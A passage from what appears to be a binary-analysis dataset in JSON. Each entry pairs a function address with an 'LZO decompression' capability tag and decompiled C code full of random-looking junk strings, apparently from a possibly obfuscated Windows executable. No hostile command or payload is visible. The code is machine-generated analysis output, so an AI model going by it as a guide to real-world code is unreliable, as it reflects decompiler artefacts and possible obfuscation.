code_r0x0042db97;\n            fcn.00401a32(iStack124);\n        }\n        if (in_stack_00000040 < 0x10) {\ncode_r0x0042db72:\n            *in_FS_OFFSET = piStack72;\n            return piStack72;\n        }\n        puStack128 = in_stack_0000002c;\n        if ((in_stack_00000040 + 1 < 0x1000) ||\n           (puStack128 = *(in_stack_0000002c + -4),  iStack124 = unaff_EDI, \n           in_stack_0000002c + (-4 - puStack128) < 0x20)) {\n            fcn.00401a32(puStack128);\n            goto code_r0x0042db72;\n        }\n    }\n    else {\n        iStack124 = in_stack_ffffffd8;\n        if ((uStack20 + 1 < 0x1000) ||\n           (iStack124 = *(in_stack_ffffffd8 + -4),  unaff_EDI = iStack124,  (in_stack_ffffffd8 + -4) - iStack124 < 0x20)\n           ) {\n            ppuStack76 = &ppuStack76;\n            fcn.00401a32(iStack124);\n            ppuVar1 = ppuStack76;\n            goto code_r0x0042dae7;\n        }\n        uStack64 = 0;\n        fcn.004047f5();\ncode_r0x0042db97:\n        uStack64 = 1;\n        fcn.004047f5();\n    }\n    uStack64 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puStack144 = &uStack232;\n    uStack132 = 0xffffffff;\n    uStack136 = 0x44c4c0;\n    piStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack140;\n    uStack204 = 0;\n    uStack200 = 0xf;\n    iStack220 = 0;\n    uStack228 = iStack172;\n    pcStack224 = \"grngibklvjpnrbuvjizpxazrgpr\";\n    uStack232 = 0x1b;\n    fcn.00402f72();\n    uStack156 = 0;\n    uStack152 = 0xf;\n    iStack172 = 0;\n    uStack132 = 2;\n    fcn.00402f72(0x1b, iStack196, \"grngibklvjpnrbuvjizpxazrgpr\");\n    uStack180 = 0;\n    uStack176 = 0xf;\n    iStack196 = 0;\n    uStack132 = 3;\n    fcn.00402f72(0x1b, uStack148, \"grngibklvjpnrbuvjizpxazrgpr\");\n    if (uStack176 < 0x10) {\ncode_r0x0042dd03:\n        if (0xf < uStack152) {\n            iVar2 = iStack172;\n            if ((0xfff < uStack152 + 1) && (iVar2 = *(iStack172 + -4),  0x1f < (iStack172 + -4) - iVar2))\n            goto code_r0x0042dd94;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack200) {\n            iVar2 = iStack220;\n            if ((0xfff < uStack200 + 1) && (iVar2 = *(iStack220 + -4),  0x1f < (iStack220 + -4) - iVar2))\n            goto code_r0x0042dda0;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack140;\n        return piStack140;\n    }\n    iVar2 = iStack196;\n    if ((uStack176 + 1 < 0x1000) || (iVar2 = *(iStack196 + -4),  (iStack196 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0042dd03;\n    }\n    uStack132 = 0;\n    fcn.004047f5();\ncode_r0x0042dd94:\n    uStack132 = 1;\n    fcn.004047f5();\ncode_r0x0042dda0:\n    uStack132 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    iVar2 = fcn.00403a76();\n    return iVar2;\n}\n",
        "token_count": 1843
    },
    "00430ef0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00430ef0(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    char *arg_8h;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000018;\n    uint32_t in_stack_0000002c;\n    uint32_t in_stack_fffffe5c;\n    uint32_t in_stack_fffffe74;\n    uint uStack364;\n    uchar uStack360;\n    char *pcStack356;\n    int32_t iStack352;\n    uint uStack336;\n    uint32_t uStack332;\n    uint32_t uStack328;\n    uint uStack312;\n    uint32_t uStack308;\n    int32_t iStack304;\n    uint uStack288;\n    uint32_t uStack284;\n    uchar uStack280;\n    uint *puStack276;\n    int32_t *piStack272;\n    uint uStack268;\n    uint uStack264;\n    int32_t iStack260;\n    uint uStack216;\n    uchar uStack212;\n    char *pcStack208;\n    int32_t iStack204;\n    uint32_t uStack188;\n    uint32_t uStack184;\n    uchar uStack180;\n    uint *puStack176;\n    int32_t *piStack172;\n    uint uStack168;\n    uint uStack164;\n    int32_t iStack160;\n    uint uStack116;\n    uchar uStack112;\n    char *pcStack108;\n    int32_t iStack104;\n    uint uStack88;\n    uint32_t uStack84;\n    uchar uStack80;\n    uint *puStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c5a0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (in_stack_0000002c < 0x10) {\ncode_r0x00430f54:\n        *in_FS_OFFSET = piStack28;\n        return piStack28;\n    }\n    iStack60 = in_stack_00000018;\n    if ((in_stack_0000002c + 1 < 0x1000) ||\n       (iStack60 = *(in_stack_00000018 + -4),  (in_stack_00000018 + -4) - iStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iStack60);\n        goto code_r0x00430f54;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack76 = &uStack116;\n    uStack64 = 0xffffffff;\n    uStack68 = 0x44c5b0;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    uStack88 = 0;\n    uStack84 = 0xf;\n    iStack104 = 0;\n    uStack112 = uStack80;\n    pcStack108 = \"bleiqzvgkbxlraugulecrygemxutfyjwkiheklikgounzarlldjcyw\";\n    uStack116 = 0x36;\n    fcn.00402f72();\n    if (uStack84 < 0x10) {\ncode_r0x0043102d:\n        *in_FS_OFFSET = piStack72;\n        return piStack72;\n    }\n    iStack160 = iStack104;\n    if ((uStack84 + 1 < 0x1000) || (iStack160 = *(iStack104 + -4),  (iStack104 + -4) - iStack160 < 0x20)) {\n        fcn.00401a32(iStack160);\n        goto code_r0x0043102d;\n    }\n    uStack64 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack176 = &uStack216;\n    uStack164 = 0xffffffff;\n    uStack168 = 0x44c5c0;\n    piStack172 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack172;\n    uStack188 = 0;\n    uStack184 = 0xf;\n    iStack204 = 0;\n    uStack212 = uStack180;\n    pcStack208 = \"mtfykgkhqhcmyoimehtbvmjsnknphwnbhffbbiknmgpuggwbybkmlwljkirdohbixiyccd\";\n    uStack216 = 0x46;\n    fcn.00402f72();\n    if (uStack184 < 0x10) {\ncode_r0x004310fd:\n        *in_FS_OFFSET = piStack172;\n        return piStack172;\n    }\n    iStack260 = iStack204;\n    if ((uStack184 + 1 < 0x1000) || (iStack260 = *(iStack204 + -4),  (iStack204 + -4) - iStack260 < 0x20)) {\n        fcn.00401a32(iStack260);\n        goto code_r0x004310fd;\n    }\n    uStack164 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack276 = &uStack364;\n    uStack268 = 0x44c5d0;\n    piStack272 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack272;\n    uStack336 = 0;\n    uStack332 = 0xf;\n    iStack352 = 0;\n    uStack264 = 8;\n    uStack360 = iStack304;\n    pcStack356 = \"tcmpewpmwsfrawiybjlnwqzkfzzt\";\n    uStack364 = 0x1c;\n    fcn.00402f72();\n    uStack288 = 0;\n    uStack284 = 0xf;\n    iStack304 = 0;\n    uStack264 = 9;\n    fcn.00402f72(0x1c, uStack328, \"tcmpewpmwsfrawiybjlnwqzkfzzt\");\n    uStack312 = 0;\n    uStack308 = 0xf;\n    uStack328 = 0;\n    uStack264 = 0xc;\n    fcn.00402f72(0x1c, uStack280, \"tcmpewpmwsfrawiybjlnwqzkfzzt\");\n    if (uStack308 < 0x10) {\ncode_r0x0043125a:\n        if (0xf < uStack284) {\n            in_stack_fffffe74 = uStack284 + 1;\n            iVar1 = iStack304;\n            if (0xfff < in_stack_fffffe74) {\n                iVar1 = *(iStack304 + -4);\n                if (0x1f < (iStack304 + -4) - iVar1) goto code_r0x00431516;\n                in_stack_fffffe74 = uStack284 + 0x24;\n            }\n            fcn.00401a32(iVar1);\n        }\n        uStack288 = 0;\n        uStack284 = 0xf;\n        iStack304 = 0;\n        uStack264 = 9;\n        fcn.00402f72(0x1c, in_stack_fffffe74 & 0xffffff00 | uStack328 & 0xff, \"tcmpewpmwsfrawiybjlnwqzkfzzt\");\n        uStack312 = 0;\n        uStack308 = 0xf;\n        uStack328 = 0;\n        uStack264 = 0xb;\n        fcn.00402f72(0x1c, uStack280, \"tcmpewpmwsfrawiybjlnwqzkfzzt\");\n        if (0xf < uStack308) {\n            in_stack_fffffe5c = uStack308 + 1;\n            uVar2 = uStack328;\n            if (0xfff < in_stack_fffffe5c) {\n                uVar2 = *(uStack328 - 4);\n                if (0x1f < (uStack328 - 4) - uVar2) goto code_r0x00431522;\n                in_stack_fffffe5c = uStack308 + 0x24;\n            }\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack284) {\n            in_stack_fffffe5c = uStack284 + 1;\n            iVar1 = iStack304;\n            if (0xfff < in_stack_fffffe5c) {\n                iVar1 = *(iStack304 + -4);\n                if (0x1f < (iStack304 + -4) - iVar1) goto code_r0x0043152e;\n                in_stack_fffffe5c = uStack284 + 0x24;\n            }\n            fcn.00401a32(iVar1);\n        }\n        uStack288 = 0;\n        uStack284 = 0xf;\n        iStack304 = 0;\n        uStack264 = 9;\n        fcn.00402f72(0x1c, in_stack_fffffe5c & 0xffffff00 | uStack328 & 0xff, \"tcmpewpmwsfrawiybjlnwqzkfzzt\");\n        uStack312 = 0;\n        uStack308 = 0xf;\n        uStack328 = 0;\n        uStack264 = 10;\n        fcn.00402f72(0x1c, uStack280, \"tcmpewpmwsfrawiybjlnwqzkfzzt\");\n        if (0xf < uStack308) {\n            uVar2 = uStack328;\n            if ((0xfff < uStack308 + 1) && (uVar2 = *(uStack328 - 4),  0x1f < (uStack328 - 4) - uVar2))\n            goto code_r0x0043153a;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack284) {\n            iVar1 = iStack304;\n            if ((0xfff < uStack284 + 1) && (iVar1 = *(iStack304 + -4),  0x1f < (iStack304 + -4) - iVar1))\n            goto code_r0x00431546;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack332) {\n            iVar1 = iStack352;\n            if ((0xfff < uStack332 + 1) && (iVar1 = *(iStack352 + -4),  0x1f < (iStack352 + -4) - iVar1))\n            goto code_r0x00431552;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack188) {\n            arg_8h = pcStack208;\n            if ((0xfff < uStack188 + 1) && (arg_8h = *(pcStack208 + -4),  0x1f < pcStack208 + (-4 - arg_8h)))\n            goto code_r0x0043155e;\n            fcn.00401a32(arg_8h);\n        }\n        *in_FS_OFFSET = piStack272;\n        return 1;\n    }\n    in_stack_fffffe74 = uStack308 + 1;\n    uVar2 = uStack328;\n    if (in_stack_fffffe74 < 0x1000) {\ncode_r0x0043124e:\n        fcn.00401a32(uVar2);\n        goto code_r0x0043125a;\n    }\n    uVar2 = *(uStack328 - 4);\n    if ((uStack328 - 4) - uVar2 < 0x20) {\n        in_stack_fffffe74 = uStack308 + 0x24;\n        goto code_r0x0043124e;\n    }\n    uStack264 = 0;\n    fcn.004047f5();\ncode_r0x00431516:\n    uStack264 = 1;\n    fcn.004047f5();\ncode_r0x00431522:\n    uStack264 = 2;\n    fcn.004047f5();\ncode_r0x0043152e:\n    uStack264 = 3;\n    fcn.004047f5();\ncode_r0x0043153a:\n    uStack264 = 4;\n    fcn.004047f5();\ncode_r0x00431546:\n    uStack264 = 5;\n    fcn.004047f5();\ncode_r0x00431552:\n    uStack264 = 6;\n    fcn.004047f5();\ncode_r0x0043155e:\n    uStack264 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    iVar1 = fcn.00403a76();\n    return iVar1;\n}\n",
        "token_count": 3033
    },
    "00431eb0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.00431eb0(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int32_t **in_FS_OFFSET;\n    float10 in_ST0;\n    uint32_t in_stack_00000018;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c600;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (0xf < in_stack_00000018) {\n        arg_8h = param_1;\n        if ((0xfff < in_stack_00000018 + 1) && (arg_8h = *(param_1 + -4),  0x1f < (param_1 + -4) - arg_8h)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            fcn.004052d1();\n            return *0x5422e4;\n        }\n        ppuStack32 = &ppuStack32;\n        in_ST0 = fcn.00401a32(arg_8h);\n    }\n    *in_FS_OFFSET = piStack28;\n    return in_ST0;\n}\n",
        "token_count": 301
    },
    "004340f0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t * fcn.004340f0(uint param_1, uint param_2, uint32_t param_3, uint32_t param_4, uint param_5, int32_t param_6)\n\n{\n    uchar **ppuVar1;\n    int32_t iVar2;\n    uint32_t *arg_8h;\n    uchar *arg_8h_00;\n    uint32_t arg_8h_01;\n    uint32_t unaff_EBX;\n    uchar *unaff_EBP;\n    uint32_t *unaff_EDI;\n    uint32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000002c;\n    int32_t aiStack208 [4];\n    uint uStack192;\n    uint32_t uStack188;\n    int32_t iStack184;\n    uint uStack168;\n    uint32_t uStack164;\n    int32_t iStack160;\n    uint uStack144;\n    uint32_t uStack140;\n    uchar uStack136;\n    int32_t *piStack132;\n    uint32_t *puStack128;\n    uint uStack124;\n    uint uStack120;\n    uchar *puStack116;\n    uint32_t *puStack112;\n    int32_t iStack96;\n    uchar **ppuStack76;\n    uint32_t *puStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uchar **ppuStack32;\n    uint32_t *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c6b0;\n    puStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack28;\n    if (in_stack_0000002c < 0x10) {\ncode_r0x00434154:\n        *in_FS_OFFSET = puStack28;\n        return puStack28;\n    }\n    iStack60 = param_6;\n    if ((in_stack_0000002c + 1 < 0x1000) || (iStack60 = *(param_6 + -4),  (param_6 + -4) - iStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iStack60);\n        goto code_r0x00434154;\n    }\n    uStack20 = 0;\n    puVar3 = unaff_EDI;\n    uVar4 = unaff_EBX;\n    fcn.004047f5();\n    fcn.004052d1();\n    ppuStack76 = &ppuStack76;\n    puStack116 = &stack0xffffffd8;\n    uStack64 = 0xffffffff;\n    uStack68 = 0x44c6c0;\n    puStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack72;\n    puStack112 = unaff_EDI;\n    ppuVar1 = &ppuStack76;\n    if (uVar4 < 0x10) {\ncode_r0x004341f4:\n        ppuStack76 = ppuVar1;\n        puVar3 = NULL;\n        uVar4 = 0xf;\n        puStack28 = puStack28 & 0xffffff00;\n        if (param_4 < 0x10) {\ncode_r0x0043423a:\n            *in_FS_OFFSET = puStack72;\n            return 0;\n        }\n        puStack116 = unaff_EBP;\n        if ((param_4 + 1 < 0x1000) || (puStack116 = *(unaff_EBP + -4),  unaff_EBP + (-4 - puStack116) < 0x20)) {\n            fcn.00401a32(puStack116);\n            goto code_r0x0043423a;\n        }\n    }\n    else {\n        puStack112 = puStack28;\n        if ((uVar4 + 1 < 0x1000) ||\n           (puStack112 = puStack28[-1],  unaff_EDI = puStack112,  puStack28 + (-4 - puStack112) < 0x20)) {\n            ppuStack76 = &ppuStack76;\n            fcn.00401a32(puStack112);\n            puStack112 = unaff_EDI;\n            ppuVar1 = ppuStack76;\n            goto code_r0x004341f4;\n        }\n        uStack64 = 0;\n        fcn.004047f5();\n    }\n    uStack64 = 1;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    piStack132 = aiStack208;\n    uStack124 = 0x44c6d0;\n    puStack128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack128;\n    uStack192 = 0;\n    uStack188 = 0xf;\n    aiStack208[0] = 0;\n    uStack120 = 7;\n    fcn.00402f72(0x2e, iStack160, \"phftfskdayzbganivquaircrecnxegoxlsqxebuwkyvpnw\");\n    uStack144 = 0;\n    uStack140 = 0xf;\n    iStack160 = 0;\n    uStack120 = 8;\n    fcn.00402f72(0x2e, iStack184, \"phftfskdayzbganivquaircrecnxegoxlsqxebuwkyvpnw\");\n    uStack168 = 0;\n    uStack164 = 0xf;\n    iStack184 = 0;\n    uStack120 = 9;\n    fcn.00402f72(0x2e, uStack136, \"phftfskdayzbganivquaircrecnxegoxlsqxebuwkyvpnw\");\n    if (uStack164 < 0x10) {\ncode_r0x004343bb:\n        if (0xf < uStack140) {\n            iVar2 = iStack160;\n            if ((0xfff < uStack140 + 1) && (iVar2 = *(iStack160 + -4),  0x1f < (iStack160 + -4) - iVar2))\n            goto code_r0x00434562;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack188) {\n            iVar2 = aiStack208[0];\n            if ((0xfff < uStack188 + 1) && (iVar2 = *(aiStack208[0] + -4),  0x1f < (aiStack208[0] + -4) - iVar2))\n            goto code_r0x0043456e;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < ppuStack76) {\n            iVar2 = iStack96;\n            if ((0xfff < ppuStack76 + 1) && (iVar2 = *(iStack96 + -4),  0x1f < (iStack96 + -4) - iVar2))\n            goto code_r0x0043457a;\n            fcn.00401a32(iVar2);\n        }\n        ppuStack76 = 0xf;\n        if (0xf < unaff_EBX) {\n            arg_8h = puStack72;\n            if ((0xfff < unaff_EBX + 1) && (arg_8h = puStack72[-1],  0x1f < puStack72 + (-4 - arg_8h)))\n            goto code_r0x00434586;\n            fcn.00401a32(arg_8h);\n        }\n        puStack72 = puStack72 & 0xffffff00;\n        if (0xf < puVar3) {\n            arg_8h_00 = ppuStack32;\n            if ((0xfff < puVar3 + 1U) && (arg_8h_00 = *(ppuStack32 + -4),  0x1f < ppuStack32 + (-4 - arg_8h_00)))\n            goto code_r0x00434592;\n            fcn.00401a32(arg_8h_00);\n        }\n        ppuStack32 = ppuStack32 & 0xffffff00;\n        if (0xf < param_3) {\n            arg_8h_01 = uVar4;\n            if ((0xfff < param_3 + 1) && (arg_8h_01 = *(uVar4 - 4),  0x1f < (uVar4 - 4) - arg_8h_01))\n            goto code_r0x0043459e;\n            fcn.00401a32(arg_8h_01);\n        }\n        *in_FS_OFFSET = puStack128;\n        return 0;\n    }\n    iVar2 = iStack184;\n    if ((uStack164 + 1 < 0x1000) || (iVar2 = *(iStack184 + -4),  (iStack184 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x004343bb;\n    }\n    uStack120 = 0;\n    fcn.004047f5();\ncode_r0x00434562:\n    uStack120 = 1;\n    fcn.004047f5();\ncode_r0x0043456e:\n    uStack120 = 2;\n    fcn.004047f5();\ncode_r0x0043457a:\n    uStack120 = 3;\n    fcn.004047f5();\ncode_r0x00434586:\n    uStack120 = 4;\n    fcn.004047f5();\ncode_r0x00434592:\n    uStack120 = 5;\n    fcn.004047f5();\ncode_r0x0043459e:\n    uStack120 = 6;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar4 = fcn.00403a76();\n    return uVar4;\n}\n",
        "token_count": 2292
    },
    "00434c80": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint * fcn.00434c80(void)\n\n{\n    int32_t arg_8h;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_00000014;\n    uint32_t in_stack_00000028;\n    uchar uStack52;\n    uint *in_stack_ffffffd8;\n    uchar **ppuStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c700;\n    puStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack28;\n    if (0xf < in_stack_00000028) {\n        arg_8h = in_stack_00000014;\n        if ((0xfff < in_stack_00000028 + 1) &&\n           (arg_8h = *(in_stack_00000014 + -4),  0x1f < (in_stack_00000014 + -4) - arg_8h)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            fcn.004052d1();\n            *in_stack_ffffffd8 = 0;\n            in_stack_ffffffd8[4] = 0;\n            in_stack_ffffffd8[5] = 0xf;\n            *in_stack_ffffffd8 = 0;\n            fcn.00402f72(0x10, uStack52, \"ypuvgkkcaiaxnrur\");\n            return in_stack_ffffffd8;\n        }\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(arg_8h);\n    }\n    *in_FS_OFFSET = puStack28;\n    return puStack28;\n}\n",
        "token_count": 400
    },
    "00436e90": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint * fcn.00436e90(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t arg_8h;\n    int32_t **in_FS_OFFSET;\n    uint auStack72 [2];\n    char *pcStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack72;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c7b0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    pcStack64 = \"sbjjtvpyahexvalvjlqljzazpluukphyuzsopxfckqmuijcvaglthbpupckulwwozkahkrrkjbxwpslwhntldzzpstp\";\n    auStack72[0] = 0x5b;\n    fcn.00402f72();\n    param_1[5] = 0xf;\n    param_1[4] = 8;\n    param_1[1] = 0x776e6872;\n    *param_1 = 0x6e626873;\n    *(param_1 + 2) = 0;\n    if (0xf < uStack40) {\n        arg_8h = iStack60;\n        if ((0xfff < uStack40 + 1) && (arg_8h = *(iStack60 + -4),  0x1f < (iStack60 + -4) - arg_8h)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            puVar1 = fcn.004052d1();\n            return puVar1;\n        }\n        fcn.00401a32(arg_8h);\n    }\n    *in_FS_OFFSET = piStack28;\n    return param_1;\n}\n",
        "token_count": 473
    },
    "00438610": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.00438610(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *arg_8h;\n    uint32_t unaff_EBX;\n    int32_t **in_FS_OFFSET;\n    float10 in_ST0;\n    float10 fVar3;\n    uint32_t in_stack_0000001c;\n    uint32_t in_stack_fffffed0;\n    uint uStack236;\n    uchar uStack232;\n    char *pcStack228;\n    int32_t iStack224;\n    uint uStack208;\n    uint32_t uStack204;\n    int32_t iStack200;\n    uint uStack184;\n    uint32_t uStack180;\n    int32_t iStack176;\n    uint uStack160;\n    uint32_t uStack156;\n    int32_t iStack152;\n    uint uStack136;\n    uint32_t uStack132;\n    uint32_t uStack128;\n    uint uStack112;\n    uint32_t uStack108;\n    int32_t iStack104;\n    uint uStack88;\n    uint32_t uStack84;\n    uchar uStack80;\n    uint *puStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c840;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (in_stack_0000001c < 0x10) {\ncode_r0x00438674:\n        *in_FS_OFFSET = piStack28;\n        return in_ST0;\n    }\n    iStack60 = param_2;\n    if ((in_stack_0000001c + 1 < 0x1000) || (iStack60 = *(param_2 + -4),  (param_2 + -4) - iStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        in_ST0 = fcn.00401a32(iStack60);\n        goto code_r0x00438674;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack76 = &uStack236;\n    uStack68 = 0x44c850;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    uStack208 = 0;\n    uStack204 = 0xf;\n    iStack224 = 0;\n    uStack64 = 9;\n    uStack232 = iStack200;\n    pcStack228 = \"uxpjckxbruqvfaowlprymboubg\";\n    uStack236 = 0x1a;\n    fcn.00402f72();\n    uStack184 = 0;\n    uStack180 = 0xf;\n    iStack200 = 0;\n    uStack64 = 10;\n    fcn.00402f72(0x12, iStack176, \"qtxiwntfxxjufzwjbs\");\n    uStack160 = 0;\n    uStack156 = 0xf;\n    iStack176 = 0;\n    uStack64 = 0xb;\n    fcn.00402f72(0x29, iStack152, \"yjwydijoncrvnljquzzgsjsdjjiptughaavipyufc\");\n    uStack136 = 0;\n    uStack132 = 0xf;\n    iStack152 = 0;\n    uStack64 = 0xc;\n    fcn.00402f72(0x45, iStack104, \"pzzoiwvltusvydzmqxmybqdiuufzuivbkxjucwsvjurktzwezmocrerbaemdzuurchptm\");\n    uStack88 = 0;\n    uStack84 = 0xf;\n    iStack104 = 0;\n    uStack64 = 0xd;\n    fcn.00402f72(0x12, uStack128, \"qtxiwntfxxjufzwjbs\");\n    uStack112 = 0;\n    uStack108 = 0xf;\n    uStack128 = 0;\n    uStack64 = 0xf;\n    fcn.00402f72(0x12, uStack80, \"qtxiwntfxxjufzwjbs\");\n    if (uStack108 < 0x10) {\ncode_r0x004388c1:\n        if (0xf < uStack84) {\n            in_stack_fffffed0 = uStack84 + 1;\n            iVar2 = iStack104;\n            if (0xfff < in_stack_fffffed0) {\n                iVar2 = *(iStack104 + -4);\n                if (0x1f < (iStack104 + -4) - iVar2) goto code_r0x00438b4c;\n                in_stack_fffffed0 = uStack84 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack88 = 0;\n        uStack84 = 0xf;\n        iStack104 = 0;\n        uStack64 = 0xd;\n        fcn.00402f72(0x1a, in_stack_fffffed0 & 0xffffff00 | uStack128 & 0xff, \"uxpjckxbruqvfaowlprymboubg\");\n        uStack112 = 0;\n        uStack108 = 0xf;\n        uStack128 = 0;\n        uStack64 = 0xe;\n        fcn.00402f72(0x1a, uStack80, \"uxpjckxbruqvfaowlprymboubg\");\n        if (0xf < uStack108) {\n            uVar1 = uStack128;\n            if ((0xfff < uStack108 + 1) && (uVar1 = *(uStack128 - 4),  0x1f < (uStack128 - 4) - uVar1))\n            goto code_r0x00438b58;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack84) {\n            iVar2 = iStack104;\n            if ((0xfff < uStack84 + 1) && (iVar2 = *(iStack104 + -4),  0x1f < (iStack104 + -4) - iVar2))\n            goto code_r0x00438b64;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack132) {\n            iVar2 = iStack152;\n            if ((0xfff < uStack132 + 1) && (iVar2 = *(iStack152 + -4),  0x1f < (iStack152 + -4) - iVar2))\n            goto code_r0x00438b70;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack156) {\n            iVar2 = iStack176;\n            if ((0xfff < uStack156 + 1) && (iVar2 = *(iStack176 + -4),  0x1f < (iStack176 + -4) - iVar2))\n            goto code_r0x00438b7c;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack180) {\n            iVar2 = iStack200;\n            if ((0xfff < uStack180 + 1) && (iVar2 = *(iStack200 + -4),  0x1f < (iStack200 + -4) - iVar2))\n            goto code_r0x00438b88;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack204) {\n            iVar2 = iStack224;\n            if ((0xfff < uStack204 + 1) && (iVar2 = *(iStack224 + -4),  0x1f < (iStack224 + -4) - iVar2))\n            goto code_r0x00438b94;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < unaff_EBX) {\n            arg_8h = piStack28;\n            if ((0xfff < unaff_EBX + 1) && (arg_8h = piStack28[-1],  0x1f < piStack28 + (-4 - arg_8h)))\n            goto code_r0x00438ba0;\n            fcn.00401a32(arg_8h);\n        }\n        *in_FS_OFFSET = piStack72;\n        return *0x542580;\n    }\n    in_stack_fffffed0 = uStack108 + 1;\n    uVar1 = uStack128;\n    if (in_stack_fffffed0 < 0x1000) {\ncode_r0x004388b5:\n        fcn.00401a32(uVar1);\n        goto code_r0x004388c1;\n    }\n    uVar1 = *(uStack128 - 4);\n    if ((uStack128 - 4) - uVar1 < 0x20) {\n        in_stack_fffffed0 = uStack108 + 0x24;\n        goto 